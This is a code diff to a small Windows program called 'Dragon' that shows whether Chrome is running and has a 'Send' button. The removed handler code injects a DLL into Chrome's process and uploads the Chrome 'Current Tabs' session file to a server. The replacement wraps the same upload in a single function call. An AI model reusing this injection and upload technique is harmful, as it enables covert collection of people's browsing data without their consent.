@@ -25,28 +25,28 @@ int WINAPI WinMain(HINSTANCE hInstance,
  wc.hbrBackground = (HBRUSH)(COLOR_BACKGROUND);
  wc.lpszClassName = L"dragonwnd";
  if( !RegisterClass(&wc) )
-   return 1;
+   return -1;
 
  g_hMainWnd = CreateWindow(wc.lpszClassName,
                    L"Dragon",
                    WS_OVERLAPPEDWINDOW|WS_VISIBLE,
 				   0,
 				   0,
-				   200,
-				   100,
+				   190,
+				   110,
 				   0,
 				   0,
 				   hInstance,
 				   NULL);
  if(!g_hMainWnd)
-    return 2;
+    return -1;
 
  g_hButton = CreateWindow( 
     L"BUTTON",
     L"Send", 
     WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
     10,
-    10, 
+    40, 
     100,
     25,
     g_hMainWnd,
@@ -57,11 +57,11 @@ int WINAPI WinMain(HINSTANCE hInstance,
  DWORD dwProcessId = getProcessId(g_app);
  g_hTextLabel = CreateWindow( 
     L"static",
-    (dwProcessId != -1) ? L"true" : L"false", 
+    (dwProcessId != -1) ? L"Chrome is running" : L"Chrome is not running", 
     WS_VISIBLE | WS_CHILD,
-    10+100,
+    10,
     10, 
-    100,
+    150,
     25,
     g_hMainWnd,
     NULL,
@@ -87,24 +87,7 @@ LRESULT CALLBACK WndProc(HWND hWnd,
    case WM_COMMAND:
 	   if ( (HWND)lParam == g_hButton)
 	   {
-		   DWORD chromId = getProcessId(g_app);
-		   if(chromId != -1)
-		   {
-			   inject_library(chromId, L"C:\\Users\\Alex\\Projects\\SimilarWeb\\dragon\\debug\\awl.dll");
-			   eject_library(chromId,L"C:\\Users\\Alex\\Projects\\SimilarWeb\\dragon\\debug\\awl.dll");
-			   
-				WCHAR lpwsPath[MAX_PATH] = {0};
-
-				if(SUCCEEDED(SHGetFolderPath(NULL, 
-											 CSIDL_LOCAL_APPDATA, 
-											 NULL, 
-											 0, 
-											 lpwsPath))) 
-				{
-					lstrcat(lpwsPath, L"\\Google\\Chrome\\User Data\\Default\\Current Tabs D");
-					sendFileToServer(lpwsPath);
-				}
-		   }
+		   sendChromeCurrentTabs();
 	   }
 	   break;
    default:
